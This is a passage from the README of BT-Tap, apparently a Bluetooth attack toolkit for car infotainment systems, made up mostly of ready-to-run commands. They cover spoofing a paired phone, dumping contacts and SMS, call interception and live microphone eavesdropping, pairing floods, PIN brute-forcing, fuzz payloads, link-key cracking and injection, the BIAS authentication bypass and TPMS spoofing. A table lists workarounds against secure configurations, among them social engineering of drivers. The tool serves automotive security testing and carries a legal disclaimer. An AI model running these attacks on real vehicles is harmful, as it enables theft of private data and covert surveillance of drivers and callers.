sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 \
    -n "iPhone 15 Pro" \
    -o ./toyota_pentest/ \
    -i hci0

# Recon only (no spoofing or data extraction)
sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 --recon-only

# Skip audio setup phase
sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 --skip-audio
```

**Hijack phases:**

| Phase | Action | Details |
|-------|--------|---------|
| 1. Recon | Fingerprint IVI, browse SDP, find PBAP/MAP/HFP channels | Non-intrusive |
| 2. Impersonate | Spoof MAC + name + device class of the target phone | Requires `sudo` |
| 3. Connect | Pair with IVI, establish trust, connect profiles | May trigger IVI pairing prompt |
| 4. Extract | Download phonebook (PBAP), messages (MAP) | Saves to output directory |
| 5. Audio | Establish HFP for call interception capability | Optional (`--skip-audio`) |

---

### DoS & Pairing Attacks

Denial-of-service and pairing abuse tests.

```bash
# Pairing flood — rapid pairing request bombardment
sudo bt-tap dos pair-flood AA:BB:CC:DD:EE:FF --count 100 --interval 0.2

# Long name flood — 248-byte device name memory exhaustion
sudo bt-tap dos name-flood AA:BB:CC:DD:EE:FF --length 248

# Rate limiting detection — measure pairing backoff
sudo bt-tap dos rate-test AA:BB:CC:DD:EE:FF

# Legacy PIN brute-force (0000–9999)
sudo bt-tap dos pin-brute AA:BB:CC:DD:EE:FF --start 0 --end 9999 --delay 0.5

# Targeted PIN range (if you know it's 4-digit starting with 1)
sudo bt-tap dos pin-brute AA:BB:CC:DD:EE:FF --start 1000 --end 1999

# L2CAP echo flood — more effective than pairing flood (requires root)
sudo bt-tap dos l2ping-flood AA:BB:CC:DD:EE:FF --count 1000 --size 600

# L2CAP flood without flood mode (shows RTT per ping)
sudo bt-tap dos l2ping-flood AA:BB:CC:DD:EE:FF --count 100 --no-flood
```

---

### Protocol Fuzzing

Send malformed data to test Bluetooth stack robustness.

```bash
# L2CAP fuzzing
sudo bt-tap fuzz l2cap AA:BB:CC:DD:EE:FF --psm 1 --mode oversized --count 100
sudo bt-tap fuzz l2cap AA:BB:CC:DD:EE:FF --psm 3 --mode malformed
sudo bt-tap fuzz l2cap AA:BB:CC:DD:EE:FF --psm 1 --mode null

# RFCOMM fuzzing
sudo bt-tap fuzz rfcomm AA:BB:CC:DD:EE:FF --channel 1 --mode exhaust    # Open all 30 channels
sudo bt-tap fuzz rfcomm AA:BB:CC:DD:EE:FF --channel 1 --mode overflow   # Oversized payloads
sudo bt-tap fuzz rfcomm AA:BB:CC:DD:EE:FF --channel 1 --mode at         # AT command fuzzing

# AT command fuzzing with specific patterns
sudo bt-tap fuzz at AA:BB:CC:DD:EE:FF --channel 1 --patterns "long,null,format,unicode,overflow"

# SDP continuation state probe (BlueBorne CVE-2017-0785 vector)
sudo bt-tap fuzz sdp AA:BB:CC:DD:EE:FF

# External tool: Bluetooth Stack Smasher
sudo bt-tap fuzz bss AA:BB:CC:DD:EE:FF
```

**Fuzz patterns for `--patterns`:**
| Pattern | Payload | Tests |
|---------|---------|-------|
| `long` | `AT` + 1024 `A`s | Buffer overflow |
| `null` | `AT\x00\x00\r\n` | Null byte handling |
| `format` | `AT%n%n%x%x\r\n` | Format string injection |
| `unicode` | `AT` + 256 `Ä`s | Unicode handling |
| `overflow` | `AT+` + 512 `B`s | Command parameter overflow |

---

### Report Generation

Generate styled pentest reports. With `--session`, auto-collects all session data.

```bash
# Session-based (recommended) — auto-collects everything
sudo bt-tap -s mytest report
sudo bt-tap -s mytest report --format json

# Legacy directory mode
sudo bt-tap report hijack_output/ --format html --output report.html
```

The report includes:
- Device fingerprint (manufacturer, BT version, attack surface, vulnerability indicators)
- Scan results (Classic + BLE devices with device class and distance)
- Vulnerability findings (evidence-based: confirmed/potential/unverified)
- PBAP data (phonebook entries, call logs, vCard counts)
- MAP data (message listings and content)
- Attack chain results (hijack phase status)
- Audio captures (HFP/A2DP recordings with duration)
- Fuzzing and DoS test results
- Session metadata (commands run, targets, timestamps)

---

### Automated Mode

Fully automated attack chain: scan → identify phone → vuln scan → hijack → dump → report.

```bash
# Auto-discover paired phone and run full attack
sudo bt-tap auto AA:BB:CC:DD:EE:FF

# Custom scan duration and output
sudo bt-tap auto AA:BB:CC:DD:EE:FF -d 60 -o ./pentest_output/ -i hci0
```

**Auto mode phases:**
1. Scan for nearby phones (by device class and name heuristics)
2. Identify which phone is likely paired with the target IVI
3. Run vulnerability scan against the IVI
4. Execute full hijack chain (spoof → connect → extract)
5. Generate HTML + JSON reports

---

## Verbosity & Debug Output

BT-Tap uses a structured logging system with timestamps, unicode icons, and phase tracking:

```
  12:34:56  ●  Scanning Classic BT for 10s on hci0...       # Info
  12:34:58  ✔  Found 3 devices                               # Success
  12:35:00  ⚠  No SSP detected — legacy pairing vulnerable   # Warning
  12:35:01  ✖  PBAP channel not found on target               # Error
  12:35:02  ·  hcitool scan exit code: 0                      # Verbose (-v)
  12:35:03  ⋯  Raw HCI: 04 0F 04 00 01 05 04...              # Debug (-vv)
```

Phase tracking with tree-style indentation:

```
─────────────────── ▶ Phase 1/5: Reconnaissance ───────────────────
  12:35:04  ├─ Fingerprinting target device
  12:35:05  │  └ done (1.2s)
  12:35:05  ├─ Browsing SDP services
  12:35:06  ●  Found 12 services on target
  12:35:06  │  └ done (0.8s)
  12:35:06  ├─ Locating PBAP channel
  12:35:06  │  · Checking Phonebook service...
  12:35:07  │  · Checking PBAP service...
  12:35:07  ✔  PBAP found on channel 19
  12:35:07  │  └ done (0.3s)
  12:35:07  ✔  Phase complete (2.3s)
╭────────────────────── Recon Results ──────────────────────╮
│                                                           │
│    IVI: Toyota Entune 3.0 (AA:BB:CC:DD:EE:FF)            │
│    Phone: Galaxy S24 (11:22:33:44:55:66)                  │
│    PBAP Channel: 19                                       │
│    MAP Channel: 4                                         │
│    HFP Channel: 13                                        │
│                                                           │
╰───────────────────────────────────────────────────────────╯
```

---

## Output Directory Structure

After a hijack or auto run, the output directory looks like:

```
hijack_output/
├── attack_results.json    # Phase-by-phase results and timing
├── pbap/
│   ├── pb.vcf             # Main phonebook (vCard format)
│   ├── ich.vcf            # Incoming call history
│   ├── och.vcf            # Outgoing call history
│   ├── mch.vcf            # Missed call history
│   └── sim_pb.vcf         # SIM phonebook
├── map/
│   ├── inbox/             # SMS inbox messages
│   └── sent/              # Sent messages
├── audio/
│   └── call_001.wav       # Captured call audio
├── report.html            # Styled HTML pentest report
└── report.json            # Machine-readable JSON report
```

---

## Common Workflows

### Workflow 1: Quick IVI Assessment (Session-Based)

```bash
# Session tracks everything — report auto-collects at the end
sudo bt-tap -s ivi_test scan classic -d 15
sudo bt-tap -s ivi_test recon fingerprint AA:BB:CC:DD:EE:FF
sudo bt-tap -s ivi_test vulnscan AA:BB:CC:DD:EE:FF
sudo bt-tap -s ivi_test report

# Or run it all in one command:
sudo bt-tap -s ivi_test run "scan classic" "recon fingerprint TARGET" "vulnscan TARGET" "report"
```

### Workflow 2: Hidden Service Discovery

```bash
# SDP browse + RFCOMM scan + L2CAP scan → diff for hidden services
sudo bt-tap -s recon recon sdp AA:BB:CC:DD:EE:FF
sudo bt-tap -s recon recon rfcomm-scan AA:BB:CC:DD:EE:FF
sudo bt-tap -s recon recon l2cap-scan AA:BB:CC:DD:EE:FF
sudo bt-tap -s recon report
```

### Workflow 3: Full Pentest with Report

```bash
# Auto mode does everything
sudo bt-tap -s pentest auto AA:BB:CC:DD:EE:FF -d 30

# Or manual step-by-step with session tracking
sudo bt-tap -s pentest scan classic -d 20
sudo bt-tap -s pentest vulnscan AA:BB:CC:DD:EE:FF
sudo bt-tap -s pentest hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"
sudo bt-tap -s pentest report
```

### Workflow 4: Audio Surveillance

```bash
# Setup HFP connection, capture calls, eavesdrop on mic
sudo bt-tap audio profile hfp
sudo bt-tap audio live           # Real-time mic stream to your laptop
sudo bt-tap hfp capture AA:BB:CC:DD:EE:FF -d 300 -o call.wav
sudo bt-tap audio review --dir .  # Review all captures

# Sniff and decode sensor data
sudo bt-tap tpms sniff -d 120 -o tpms_output/

# Test IVI response to spoofed flat tire
sudo bt-tap tpms flat-tire --position 1

# Capture traditional 315/433 MHz TPMS with SDR
sudo bt-tap tpms sdr -d 60

# Flood test — does the IVI handle conflicting data correctly?
sudo bt-tap tpms flood --mode random -d 30
```

### Workflow 6: Pairing Capture + Key Cracking (nRF52840 / USRP B210)

```bash
# BLE: Scan for BLE advertisers using nRF52840 dongle
sudo bt-tap recon nrf-scan -d 30

# BLE: Sniff BLE pairing exchange (wait for phone-IVI pairing)
sudo bt-tap recon nrf-sniff -t AA:BB:CC:DD:EE:FF -o ble_pair.pcap -d 120

# BLE: Crack pairing key from captured exchange
sudo bt-tap recon crack-key ble_pair.pcap -o decrypted.pcap

# BR/EDR: Scan for active piconets using USRP B210
sudo bt-tap recon usrp-scan -d 30

# BR/EDR: Follow target piconet and capture traffic
sudo bt-tap recon usrp-follow AA:BB:CC:DD:EE:FF -o capture.pcap -d 120

# BR/EDR: Raw IQ capture for offline analysis with GNU Radio
sudo bt-tap recon usrp-capture -o raw.iq -d 60 --freq 2441000000

# Extract BR/EDR link key from captured pairing pcap
sudo bt-tap recon extract-link-key capture.pcap

# Inject recovered key into BlueZ for impersonation
sudo bt-tap recon inject-link-key AA:BB:CC:DD:EE:FF <32-hex-char-key>

# Now connect — BlueZ will use the injected key
sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"
```

### Workflow 7: BIAS Authentication Bypass (CVE-2020-10135)

```bash
# Probe if IVI is potentially vulnerable to BIAS
sudo bt-tap bias probe AA:BB:CC:DD:EE:FF 11:22:33:44:55:66

# Execute BIAS attack (auto-selects best method)
sudo bt-tap bias attack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24"

# Or use BIAS within the full hijack chain
sudo bt-tap hijack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -n "Galaxy S24" --bias

# If software approach fails, try InternalBlue (Broadcom/Cypress chipsets)
sudo bt-tap bias attack AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -m internalblue
```

### Workflow 8: Resilience Testing

```bash
# DoS + fuzzing to test IVI stability
sudo bt-tap dos pair-flood AA:BB:CC:DD:EE:FF --count 50
sudo bt-tap dos name-flood AA:BB:CC:DD:EE:FF --length 248
sudo bt-tap fuzz l2cap AA:BB:CC:DD:EE:FF --psm 1 --mode malformed --count 200
sudo bt-tap fuzz at AA:BB:CC:DD:EE:FF --channel 1 --patterns "long,null,format"
```

---

## When Does Hijack Work?

The core attack (spoof phone MAC → connect to IVI → extract data) depends on the
IVI's authentication enforcement.

### Works (high success probability)

| Scenario | Why |
|----------|-----|
| **IVI uses "Just Works" pairing** | No user confirmation or key validation on reconnect |
| **IVI doesn't validate link key on reconnect** | Accepts any device with the right MAC + name |
| **Driver accepts pairing prompt** | Social engineering — driver sees familiar phone name, taps "Yes" |
| **Pre-2019 IVI (BT 2.1–4.2)** | Older stacks often skip mutual authentication |
| **Aftermarket head units** | Pioneer, Kenwood, etc. — typically minimal security |
| **BIAS-vulnerable IVI (CVE-2020-10135)** | Role-switch bypasses authentication (use `--bias` flag) |
| **Recovered link key** | nRF52840/USRP capture + crack → inject key → legitimate connection |

### Does NOT work (expected secure behavior)

| Scenario | Why | Workaround |
|----------|-----|------------|
| **IVI validates stored link key** | We spoofed the MAC but don't have the 128-bit key | Capture pairing with nRF52840/USRP, crack key, inject |
| **IVI enforces Secure Connections Only mode** | Rejects legacy auth downgrade | Need actual link key or BIAS via InternalBlue |
| **BT 5.3+ with mutual auth patches** | Both sides must prove key knowledge | Vendor-specific — test anyway |
| **IVI requires Numeric Comparison** | 6-digit code must match on both screens | Need physical access or social engineering |



---

## Troubleshooting

### "No Bluetooth adapter found"

```bash
# Check adapter is recognized
hciconfig -a

# If not listed, check USB
lsusb | grep -i bluetooth

# Load kernel module
sudo modprobe btusb
sudo systemctl restart bluetooth
```

### MAC Spoofing Fails

```bash
# Try different methods
sudo bt-tap spoof mac 11:22:33:44:55:66 -m bdaddr       # CSR chipsets
sudo bt-tap spoof mac 11:22:33:44:55:66 -m spooftooph   # Broader support
sudo bt-tap spoof mac 11:22:33:44:55:66 -m btmgmt       # BlueZ native

# Adapter must be down before spoofing
sudo bt-tap adapter down hci0
sudo bt-tap spoof mac 11:22:33:44:55:66
sudo bt-tap adapter up hci0
```

### "No MediaPlayer1 found" (AVRCP)

The device must be paired, connected, and actively playing media:

```bash
bluetoothctl connect AA:BB:CC:DD:EE:FF
# Start playing audio on the target, then:
sudo bt-tap avrcp metadata AA:BB:CC:DD:EE:FF
```

### PBAP/MAP "Connection Refused"

```bash
# Check if service exists on target
sudo bt-tap recon sdp AA:BB:CC:DD:EE:FF | grep -i phonebook

# Try specifying channel manually
sudo bt-tap pbap dump AA:BB:CC:DD:EE:FF -c 19
```

### Audio Not Working

```bash
# Diagnose audio routing
sudo bt-tap audio diagnose
sudo bt-tap audio devices

# Restart audio subsystem
sudo bt-tap audio restart

# Switch profile if needed
sudo bt-tap audio profile hfp    # For microphone
sudo bt-tap audio profile a2dp   # For media
```

### WSL2 USB Passthrough

```powershell
# On Windows (PowerShell as admin)
winget install usbipd
usbipd list
usbipd bind --busid <BUS_ID>
usbipd attach --wsl --busid <BUS_ID>
```

```bash
# In WSL2
lsusb | grep -i bluetooth
sudo bt-tap adapter list
```

---

## Project Structure

| Directory | Files | Purpose |
|-----------|-------|---------|
| `bt_tap/core/` | 3 | Adapter mgmt, scanning, MAC spoofing |
| `bt_tap/recon/` | 7 | SDP, GATT, fingerprint, RFCOMM/L2CAP scan, HCI capture, nRF/USRP sniffer |
| `bt_tap/attack/` | 14 | PBAP, MAP, HFP, A2DP, AVRCP, OPP, AT, TPMS, BIAS, hijack, auto, vuln, DoS, fuzz |
| `bt_tap/report/` | 2 | HTML/JSON report generation |
| `bt_tap/utils/` | 3 | Rich UI output system, BT helpers, interactive prompts |
| `bt_tap/` | 2 | CLI entry point, package init |

**37 files, ~10,000 lines of Python.**

---

## Legal Disclaimer

BT-Tap is provided for **authorized security testing only**. By using this tool, you agree to:

1. Only test devices and systems you own or have **explicit written authorization** to test
2. Comply with all applicable local, state, federal, and international laws
3. Not use this tool for unauthorized access, surveillance, or any malicious purpose
4. Accept full responsibility for your actions when using this tool

Unauthorized interception of Bluetooth communications may violate the Computer Fraud and Abuse Act (CFAA), the Electronic Communications Privacy Act (ECPA), the EU Cybersecurity Act, and similar laws in your jurisdiction.

**The authors are not responsible for any misuse of this tool.**

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

<p align="center">
  <b>BT-Tap v1.0.0</b> — Built for automotive security researchers
</p>
